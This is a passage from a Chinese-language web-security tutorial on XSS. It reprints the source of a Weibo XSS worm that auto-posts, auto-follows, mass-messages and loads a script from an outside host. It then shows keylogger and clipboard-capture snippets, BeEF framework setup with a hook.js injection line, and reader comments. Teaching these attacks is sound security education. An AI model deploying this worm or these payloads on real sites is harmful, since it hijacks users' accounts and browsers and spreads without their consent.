<span class="hljs-function"><span class="hljs-keyword">function</span>&nbsp;<span class="hljs-title">post</span>(<span class="hljs-params">url,data,sync</span>)</span>{
&nbsp;&nbsp;&nbsp;&nbsp;xmlHttp&nbsp;=&nbsp;createXHR();
&nbsp;&nbsp;&nbsp;&nbsp;xmlHttp.open(<span class="hljs-string">"POST"</span>,url,sync);
&nbsp;&nbsp;&nbsp;&nbsp;xmlHttp.setRequestHeader(<span class="hljs-string">"Accept"</span>,<span class="hljs-string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>);
&nbsp;&nbsp;&nbsp;&nbsp;xmlHttp.setRequestHeader(<span class="hljs-string">"Content-Type"</span>,<span class="hljs-string">"application/x-www-form-urlencoded;&nbsp;charset=UTF-8"</span>);
&nbsp;&nbsp;&nbsp;&nbsp;xmlHttp.send(data);
}
<span class="hljs-comment">// 发表微博，话题随机</span>
<span class="hljs-function"><span class="hljs-keyword">function</span>&nbsp;<span class="hljs-title">publish</span>(<span class="hljs-params"></span>)</span>{
&nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;=&nbsp;<span class="hljs-string">'http://weibo.com/mblog/publish.php?rnd='</span>&nbsp;+&nbsp;<span class="hljs-keyword">new</span>&nbsp;<span class="hljs-built_in">Date</span>().getTime();
&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;<span class="hljs-string">'content='</span>&nbsp;+&nbsp;random_msg()&nbsp;+&nbsp;<span class="hljs-string">'&amp;pic=&amp;styleid=2&amp;retcode='</span>;&nbsp;<span class="hljs-comment">//使用 random_msg 生成随机话题</span>
&nbsp;&nbsp;&nbsp;&nbsp;post(url,data,<span class="hljs-literal">true</span>);
}
<span class="hljs-comment">// 自动关注用户</span>
<span class="hljs-function"><span class="hljs-keyword">function</span>&nbsp;<span class="hljs-title">follow</span>(<span class="hljs-params"></span>)</span>{
&nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;=&nbsp;<span class="hljs-string">'http://weibo.com/attention/aj_addfollow.php?refer_sort=profile&amp;atnId=profile&amp;rnd='</span>&nbsp;+&nbsp;<span class="hljs-keyword">new</span>&nbsp;<span class="hljs-built_in">Date</span>().getTime();
    <span class="hljs-comment">// 使用当前页面存储的$CONFIG.$uid 构造自动关注数据包</span>
&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;<span class="hljs-string">'uid='</span>&nbsp;+&nbsp;<span class="hljs-number">2201270010</span>&nbsp;+&nbsp;<span class="hljs-string">'&amp;fromuid='</span>&nbsp;+&nbsp;$CONFIG.$uid&nbsp;+&nbsp;<span class="hljs-string">'&amp;refer_sort=profile&amp;atnId=profile'</span>;
&nbsp;&nbsp;&nbsp;&nbsp;post(url,data,<span class="hljs-literal">true</span>);
}
<span class="hljs-comment">// 发送私信</span>
<span class="hljs-function"><span class="hljs-keyword">function</span>&nbsp;<span class="hljs-title">message</span>(<span class="hljs-params"></span>)</span>{
&nbsp;&nbsp;&nbsp;&nbsp;url&nbsp;=&nbsp;<span class="hljs-string">'http://weibo.com/'</span>&nbsp;+&nbsp;$CONFIG.$uid&nbsp;+&nbsp;<span class="hljs-string">'/follow'</span>;&nbsp;<span class="hljs-comment">//构造用户关注用户列表页 Url</span>
&nbsp;&nbsp;&nbsp;&nbsp;ids&nbsp;=&nbsp;getappkey(url);&nbsp;<span class="hljs-comment">//获取被关注用户的 Appkey 数组</span>
&nbsp;&nbsp;&nbsp;&nbsp;id&nbsp;=&nbsp;ids.split(<span class="hljs-string">'||'</span>);&nbsp;<span class="hljs-comment">//分割出每个被关注用户的 Appkey</span>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;id.length&nbsp;-&nbsp;<span class="hljs-number">1</span>&nbsp;&amp;&nbsp;i&lt;<span class="hljs-number">5</span>;i++){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//构造私信发送 Url</span>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msgurl&nbsp;=&nbsp;<span class="hljs-string">'http://weibo.com/message/addmsg.php?rnd='</span>&nbsp;+&nbsp;<span class="hljs-keyword">new</span>&nbsp;<span class="hljs-built_in">Date</span>().getTime();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msg&nbsp;=&nbsp;random_msg();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msg&nbsp;=&nbsp;<span class="hljs-built_in">encodeURIComponent</span>(msg);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;user&nbsp;=&nbsp;<span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-built_in">encodeURIComponent</span>(id[i]));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;<span class="hljs-string">'content='</span>&nbsp;+&nbsp;msg&nbsp;+&nbsp;<span class="hljs-string">'&amp;name='</span>&nbsp;+&nbsp;user&nbsp;+&nbsp;<span class="hljs-string">'&amp;retcode='</span>;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post(msgurl,data,<span class="hljs-literal">false</span>);  <span class="hljs-comment">//通过 XmlHttpRequest 发送请求</span>
&nbsp;&nbsp;&nbsp;&nbsp;}
}
<span class="hljs-function"><span class="hljs-keyword">function</span>&nbsp;<span class="hljs-title">main</span>(<span class="hljs-params"></span>)</span>{
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">try</span>{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;publish();&nbsp;<span class="hljs-comment">//模拟发表微博</span>
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">catch</span>(e){}
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">try</span>{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;follow();&nbsp;<span class="hljs-comment">//模拟关注用户</span>
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">catch</span>(e){}
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">try</span>{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;message();&nbsp;<span class="hljs-comment">//模拟发送私信</span>
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">catch</span>(e){}
}
<span class="hljs-keyword">try</span>{
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//在当前 body 尾部插入存放在远端的 Xss 恶意脚本</span>
&nbsp;&nbsp;&nbsp;x=<span class="hljs-string">"g=document.createElement('script');g.src='http://www.2kt.cn/images/t.js';document.body.appendChild(g)"</span>;<span class="hljs-built_in">window</span>.opener.eval(x);
}
<span class="hljs-keyword">catch</span>(e){}
main();
<span class="hljs-keyword">var</span>&nbsp;t=setTimeout(<span class="hljs-string">'location="http://weibo.com/pub/topic";'</span>,<span class="hljs-number">5000</span>);
<span class="hljs-comment">//等待 5 秒跳转到微话题页面</span>
</code></pre>
<p data-nodeid="53225">我总结了该 XSS 蠕虫的攻击流程：</p>
<ol data-nodeid="70818">
<li data-nodeid="70819">
<p data-nodeid="70820">利用 XSS 漏洞插入恶意 JS 代码；</p>
</li>
<li data-nodeid="70821">
<p data-nodeid="70822" class="te-preview-highlight">利用 XMLHttpRequest 发送请求去发表微博、关注用户、获取关注者列表并向其发送私信；</p>
</li>
<li data-nodeid="70823">
<p data-nodeid="70824">微博消息和私信都包含有恶意攻击链接，等于实现了攻击代码的自我复制和传播。</p>
</li>
</ol>




<p data-nodeid="53233">由此可见，一个完整的 XSS 蠕虫常常具备如下特征：</p>
<ul data-nodeid="53234">
<li data-nodeid="53235">
<p data-nodeid="53236">目标网站存在 XSS 漏洞；</p>
</li>
<li data-nodeid="53237">
<p data-nodeid="53238">攻击代码的自我复制和传播，其传播方式依赖于业务场景，更多是在社交功能上，比如博客、私信、微博、评论。</p>
</li>
</ul>
<p data-nodeid="53239"><strong data-nodeid="53461">声明：在互联网上传播 XSS 蠕虫属于违法行为，即使是处于合法的渗透测试任务，也该严格控制传播的可能性，否则出现失控，仍需承担法律责任</strong>。</p>
<h4 data-nodeid="53240">其他攻击方法</h4>
<p data-nodeid="53241">在 XSS 漏洞攻击场景下，凡是 JavaScript 能够实现功能，你都可以自由发挥，实现不同的攻击方法。</p>
<p data-nodeid="53242">比如键盘记录：</p>
<pre class="lang-javascript" data-nodeid="53243"><code data-language="javascript">keys = <span class="hljs-string">""</span>
<span class="hljs-built_in">document</span>.onkeypress = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{
  keys += <span class="hljs-built_in">String</span>.fromCharCode(<span class="hljs-built_in">window</span>.event.keyCode);
}
</code></pre>
<p data-nodeid="53244">比如在 Chrome 浏览器中使用代码截获剪贴板内容：</p>
<pre class="lang-javascript" data-nodeid="53245"><code data-language="javascript"><span class="hljs-built_in">document</span>.addEventListener(<span class="hljs-string">'paste'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">evt</span>) </span>{
  clipdata = evt.clipboardData || <span class="hljs-built_in">window</span>.clipboardData;
  <span class="hljs-built_in">console</span>.log(clipdata.getData(<span class="hljs-string">'text/plain'</span>));
});
</code></pre>
<p data-nodeid="53246"><img src="https://s0.lgstatic.com/i/image/M00/8B/A8/CgqCHl_cOwOAbfppAATnMiQk45A089.png" alt="Drawing 22.png" data-nodeid="53468"></p>
<div data-nodeid="53247"><p style="text-align:center">图 23：截获剪贴内容</p></div>
<p data-nodeid="53248">比如钓鱼欺骗用户输入账号、密码：</p>
<p data-nodeid="53249"><img src="https://s0.lgstatic.com/i/image2/M01/03/E6/Cip5yF_kTF-ALwT6AALUte7Tb1k341.png" alt="图片15.png" data-nodeid="53472"></p>
<div data-nodeid="53250"><p style="text-align:center">图 24：利用 XSS 进行钓鱼欺骗</p></div>
<p data-nodeid="53251">方法还有很多，因篇幅有限，这里不再赘述，你可以参考下面讲到的 XSS 攻击框架 BeEF，它在工具上集成了很多 XSS 攻击方式，可直接使用。</p>
<h4 data-nodeid="53252">BeEF</h4>
<p data-nodeid="53253">这里我要介绍一款非常著名的 XSS 攻击框架 <a href="https://beefproject.com/" data-nodeid="53478">BeEF</a>，它支持 Docker 快速安装，可以从 GitHub 下载然后编译安装：</p>
<pre class="lang-shell" data-nodeid="53254"><code data-language="shell"><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">clone</span> https://github.com/beefproject/beef</span>
<span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> beef</span>
<span class="hljs-meta">$</span><span class="bash"> sudo docker build -t beef .</span>
<span class="hljs-meta">$</span><span class="bash"> sudo docker run -p 3000:3000 -p 6789:6789 -p 61985:61985 -p 61986:61986 --name beef beef</span>
</code></pre>
<p data-nodeid="53255">运行成功后，你会得到一个 hook.js 地址，这是利用 XSS 漏洞插入目标网站的攻击脚本地址。</p>
<p data-nodeid="53256"><img src="https://s0.lgstatic.com/i/image/M00/8B/A8/CgqCHl_cOyKADDkjAAC98rkZQJg985.png" alt="Drawing 24.png" data-nodeid="53483"></p>
<div data-nodeid="53257"><p style="text-align:center">图 25：返回 hook.js 和管理界面地址</p></div>
<p data-nodeid="53258">我本地得到地址是：http://127.0.0.1:3000/hook.js（实际攻击时，可将 127.0.0.1 替换成你的远程服务器地址），那我就可以在漏洞页面插入如下代码进行利用：</p>
<pre class="lang-java" data-nodeid="53259"><code data-language="java">&lt;script&gt;http:<span class="hljs-comment">//127.0.0.1:3000/hook.js&lt;/script&gt;</span>
</code></pre>
<p data-nodeid="53260">受害者访问后，若利用成功的话，在 BeEF 管理页面（此处为 http://127.0.0.1:3000/ui/panel）就可以看到目标上线了。</p>
<p data-nodeid="53261"><img src="https://s0.lgstatic.com/i/image/M00/8B/9D/Ciqc1F_cOymAFUlLAAJ8WDrvvw8214.png" alt="Drawing 25.png" data-nodeid="53488"></p>
<div data-nodeid="53262"><p style="text-align:center">图 26：BeEF 漏洞利用框架</p></div>
<p data-nodeid="53263">刚运行的时候，BeEF 会生成随机密码，账号为 beef，比如：</p>
<pre class="lang-java" data-nodeid="53264"><code data-language="java">Beef credentials: beef:aaGivbkemeYNtCYRFrlyQN75lcmMYMm5
</code></pre>
<p data-nodeid="53265">用上面的账号密码登录即可；你也可以修改 config.yaml 中的账号密码再运行。</p>
<p data-nodeid="53266">BeEF 上面的利用功能实在是太多了，你可以把每个功能都试用一下，相信你试用完之后会对 XSS 的危害和利用手法有新的认识。</p>
<h3 data-nodeid="53267">总结</h3>
<p data-nodeid="53268">最后，我对这一讲的内容做个总结。</p>
<p data-nodeid="53269">首先，我介绍了 XSS 的起源以及危害，然后讲解了反射型、存储型和 DOM 型 XSS 的原理，并从代码层面分析了漏洞成因。随后我介绍了各种常见的 XSS 攻击手法，结合实例分析了 Cookie 窃取和蠕虫攻击的具体实现，帮助你进一步了解 XSS 的危害。</p>
<p data-nodeid="53270">BeEF 是一款优秀的 XSS 攻击框架，包含有非常丰富的 XSS 漏洞利用功能，如果你想深入学习 XSS 的攻击手段，从 BeEF 入手是不错的选择。BeEF 已经在 GitHub 开源，主要是采用 JavaScript 和 Ruby 开发，你可以重点研究下漏洞利用中的 JavaScript 代码，即 hook.js 文件。</p>
<p data-nodeid="53271">如果你有什么好的 BeEF 利用技巧，或者是其他优秀的 XSS 利用工具，欢迎你在留言区留言推荐。</p>
<p data-nodeid="53272">下一讲，我将介绍如何挖掘三大类型的 XSS 漏洞以及如何防御，到时见~</p>
<p data-nodeid="53273" class=""><img src="https://s0.lgstatic.com/i/image2/M01/03/E8/CgpVE1_kTHSAL9KqAAUNAGwX_GM335.png" alt="Lark20201224-160053.png" data-nodeid="53501"></p>

---

### 精选评论

##### **文：
> hellosamy那个，为什么蠕虫代码还要在body插入恶意脚本？不是已经执行main函数了吗😁

 ###### &nbsp;&nbsp;&nbsp; 讲师回复：
> &nbsp;&nbsp;&nbsp; 从代码逻辑上看确实可以不需要，但目前找到的样本都有这行代码

##### *贤：
> 不错不错👍

